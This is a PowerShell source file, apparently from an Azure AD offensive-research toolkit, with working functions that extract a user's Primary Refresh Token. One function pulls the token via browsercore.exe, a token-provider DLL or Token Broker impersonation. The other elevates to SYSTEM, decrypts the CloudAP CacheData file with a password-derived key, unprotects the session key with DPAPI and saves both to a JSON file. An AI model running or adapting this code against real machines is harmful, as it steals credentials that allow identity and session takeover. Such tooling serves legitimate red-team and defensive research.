# This file contains functions for Persistent Refresh Token and related device operations

# Get the PRT token from the current user
# Aug 19th 2020
# Sep 25th 2024 Added support for CloudAP
function Get-UserPRTToken
{
<#
    .SYNOPSIS
    Gets user's PRT token from the Azure AD joined or Hybrid joined computer.

    .DESCRIPTION
    Gets user's PRT token from the Azure AD joined or Hybrid joined computer.
    Uses browsercore.exe, Token Provider DLL, or CloudAP to get the PRT token.

    .Parameter Method
    Method to use to retrieve the user's PRT token.
    "BrowserCore" for browsercore.exe, "TokenProvider" for Token Provider DLL, or "CloudAP" for impersonating AAD Token Broker

    .EXAMPLE
    PS C:\> Get-AADIntUserPRTToken
    eyJ4NWMiOi...
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [ValidateSet('BrowserCore','TokenProvider','CloudAP')]
        [String]$Method="BrowserCore"
    )
    Process
    {

        # Get the nonce
        $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body "grant_type=srv_challenge"
        $nonce = $response.Nonce

        if($Method -eq "BrowserCore")
        {
            # There are two possible locations
            $locations = @(
                "$($env:ProgramFiles)\Windows Security\BrowserCore\browsercore.exe"
                "$($env:windir)\BrowserCore\browsercore.exe"
            )

            # Check the locations
            foreach($file in $locations)
            {
                if(Test-Path $file)
                {
                    $browserCore = $file
                }
            }

            if(!$browserCore)
            {
                throw "Browsercore not found!"
            }

            # Create the process
            $p = New-Object System.Diagnostics.Process
            $p.StartInfo.FileName = $browserCore
            $p.StartInfo.UseShellExecute = $false
            $p.StartInfo.RedirectStandardInput = $true
            $p.StartInfo.RedirectStandardOutput = $true
            $p.StartInfo.CreateNoWindow = $true

            # Create the message body
            $body = @"
            {
                "method":"GetCookies",
                "uri":"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce",
                "sender":"https://login.microsoftonline.com"
            }
"@
            # Start the process
            $p.Start() | Out-Null
            $stdin =  $p.StandardInput
            $stdout = $p.StandardOutput

            # Write the input
            $stdin.BaseStream.Write([bitconverter]::GetBytes($body.Length),0,4) 
            $stdin.Write($body)
            $stdin.Close()

            # Read the output
            $response=""
            while(!$stdout.EndOfStream)
            {
                $response += $stdout.ReadLine()
            }

            Write-Debug "RESPONSE: $response"
        
            $p.WaitForExit()

            # Strip the stuff from the beginning of the line
            $response = $response.Substring($response.IndexOf("{")) | ConvertFrom-Json

            # Check for error
            if($response.status -eq "Fail")
            {
                Throw "Error getting PRT: $($response.code). $($response.description)"
            }

            # Get the index of the x-ms-RefreshTokenCredential data or throw error
            $token_index = $response.response.name.IndexOf("x-ms-RefreshTokenCredential")
            if($token_index -lt 0)
            {
                throw "Could not find the x-ms-RefreshTokenCredential cookie in response"
            }

            # Return the data for x-ms-RefreshTokenCredential
            $tokens = $response.response[$token_index].data
            return $tokens
        }
        elseif($Method -eq "TokenProvider")
        {
            $tokens = [AADInternals.Native]::getCookieInfoForUri("https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=$nonce")

            if($tokens.Count)
            {
                Write-Verbose "Found $($tokens.Count) token(s)."

                # Get the index of the x-ms-RefreshTokenCredential data or throw error
                $token_index = $tokens.name.IndexOf("x-ms-RefreshTokenCredential")
                if($token_index -lt 0)
                {
                    throw "Could not find the x-ms-RefreshTokenCredential cookie in response"
                }

                # Return the data for x-ms-RefreshTokenCredential
                $token = $tokens[$token_index]["data"]
                
                return $token.Split(";")[0]
            }
            else
            {
                Throw "Error getting tokens."
            }

        }
        else # Get token from CloudAP by impersonating AAD TokenBroker 
        {
            return [AADInternals.Native]::RequestSSOCookie($nonce)
        }

    }
}

# Get logged in user's PRT and Session key from CloudAP CacheData
# Jun 2nd 2023
function Get-UserPRTKeysFromCloudAP
{
<#
    .SYNOPSIS
    Extracts the session key and primary refresh token from CloudAP cache and saves them to json file.

    .DESCRIPTION
    Extracts the session key and primary refresh token from CloudAP cache and saves them to json file.
    
    .Parameter Username
    The username of the user

    .Parameter Password
    The password of the user.

    .Parameter Credentials
    Credentials of the user.

	.Example
	PS C\:>$creds = Get-Credential
    PS C\:>$prtKeys = Get-AADIntUserPRTKeysFromCloudAP -Credentials $creds
	
	Keys saved to 31abceff-a84c-4f3b-9461-582435d7d448.json

    PS C:\>$prttoken = New-AADIntUserPRTToken -Settings $prtkeys

#>
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName='Credentials',Mandatory=$True)]
        [System.Management.Automation.PSCredential]$Credentials,

        [Parameter(ParameterSetName='SystemPassword',Mandatory=$true)]
        [string]$HexPassword,

        [Parameter(ParameterSetName='Password',Mandatory=$true)]
        [string]$Password,

        [Parameter(ParameterSetName='Password',Mandatory=$true)]
        [Parameter(ParameterSetName='SystemPassword',Mandatory=$true)]
        [string]$Username
    )
    Begin
    {
        $WAM_AAD = "B16898C6-A148-4967-9171-64D755DA8520"
        $WAM_MSA = "D7F9888F-E3FC-49b0-9EA6-A85B5F392A4F"
    }
    Process
    {
        # Check whether we are running in elevated session
        Test-LocalAdministrator -Throw | Out-Null
  
        if($Credentials)
        {
            $Username = $Credentials.UserName
            $Password = $Credentials.GetNetworkCredential().Password
        }

        # Elevate to LOCAL SYSTEM
        if((Get-CurrentUser) -ne "NT AUTHORITY\SYSTEM")
        {
            $cmdToRun = "Set-Location '$PSScriptRoot';. '.\Win32Ntv.ps1';. '.\CommonUtils.ps1';. '.\CommonUtils_endpoints.ps1';. '.\PRT_Utils.ps1';. '.\PRT.ps1'; Get-UserPRTKeysFromCloudAP -Username $Username -Password $password"
            if($HexPassword)
            {
                $cmdToRun += " -HexPassword $HexPassword"
            }
                
            try
            {
                $prtKeysJson = Invoke-ScriptAs -Command $cmdToRun -Credentials $ADSyncCredentials.Credentials
                Write-Verbose "Invoke-ScriptAs response: $prtKeysJson"
                $prtKeys = ConvertFrom-Json -InputObject $prtKeysJson
            }
            catch
            {
                throw "Unable to get PRT token and session key"
            }

        }
        else
        {
            # Find the user from registry
            $name2SidPath = "HKLM:\SOFTWARE\Microsoft\IdentityStore\LogonCache\$WAM_AAD\Name2Sid\"
            $name2SidKey = Get-Item -Path $name2SidPath -ErrorAction SilentlyContinue
        
            if($name2SidKey)
            {
                $users = $name2SidKey.GetSubKeyNames()
            }

            if($users -eq $null)
            {
                Throw "No users found from CacheData"
            }

            foreach($user in $users)
            {
                if((Get-ItemPropertyValue -Path "$name2SidPath$user" -Name IdentityName) -eq $username)
                {
                    # We found the user from registry. Get the cachedir from the key name.
                    $cacheDir = (Get-Item -Path "$name2SidPath$user").PSChildName
                    Write-Verbose "Cachedir:               $cacheDir"

                    # Create the cache data file path
                    $cacheDataFile = "$env:SystemRoot\system32\config\systemprofile\AppData\local\microsoft\windows\CloudAPCache\AzureAD\$cacheDir\Cache\CacheData"
                    break
                }
            }

            if([string]::IsNullOrEmpty($cacheDataFile))
            {
                Throw "CacheData not found for user $Username"
            }
            $CacheData = Get-BinaryContent -Path $cacheDataFile

            # Parse CacheData
            $cacheNodes = Parse-CloudAPCacheData -Data $CacheData

            $defaultIV = @(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

            foreach($node in $cacheNodes)
            {
                switch($node.Type)
                {
                    # Ref: https://github.com/synacktiv/CacheData_decrypt/blob/main/scripts/parse_cachedata.py
                    1 # Password
                    {
                        if($HexPassword)
                        {
                            $systemPassword = Convert-HexToByteArray -HexString $HexPassword
                            # Derive the key from the given "system" password
                            $derivedKey = [AADInternals.Native]::getPBKDF2($systemPassword)
            
                            Write-Verbose "Derived key:            $(Convert-ByteArrayToHex -Bytes $derivedKey)"

                            # Decrypt the secret using derived key
                            $aes     = New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
                            $aes.Key = $derivedKey
                            $aes.IV  = $defaultIV
                            $dc      = $aes.CreateDecryptor()
                            $secret  = $dc.TransformFinalBlock($node.CryptoBlob,0,$node.CryptoBlobSize)
                        }
                        else
                        {
                            # The secret is actually derived from the user's password, so we can use that (if known)
                            $secret = [AADInternals.Native]::getPBKDF2([text.encoding]::Unicode.GetBytes($Password))
                        }

                        Write-Verbose "Secret:                 $(Convert-ByteArrayToHex -Bytes $secret)"

                        # Decrypt the data blob with the secret
                        $aes      = New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
                        $aes.Key  = $secret
                        $aes.IV   = $defaultIV
                        $dc       = $aes.CreateDecryptor()
                        $dataBlob = $dc.TransformFinalBlock($node.EncryptedBlob,0,$node.EncryptedBlobSize)
                        break
                    }
                    4 # Smart Card
                    {
                        break
                    }
                    5 # PIN
                    {
                        break
                    }
                }

                # Return the first found blob
                if($dataBlob)
                {
                    # Parse the data blob
                    $prtBytes = Parse-CloudAPEncryptedBlob -Data $dataBlob 
                    $prt      = [text.encoding]::UTF8.GetString($prtBytes) | ConvertFrom-Json

                    # Decode PRT
                    $prt | Add-Member -NotePropertyName "refresh_token" -NotePropertyValue (Convert-B64ToText -B64 $prt.prt)

                    # Decrypt POP Key (Session Key) using DPAPI
                    $prt | Add-Member -NotePropertyName "session_key" -NotePropertyValue (Convert-ByteArrayToB64 -Bytes (Unprotect-POPKeyBlob -Data (Convert-B64ToByteArray -B64 $prt.ProofOfPossesionKey.KeyValue)))

                    return $prt | ConvertTo-Json
                }
            }
        }

        # Write to file
        $outFileName = "$($prtKeys.deviceId).json"
        $prtKeys | ConvertTo-Json | Set-Content $outFileName -Encoding UTF8
        Write-Host "Keys saved to $outFileName"

        return $prtKeys
    }
}

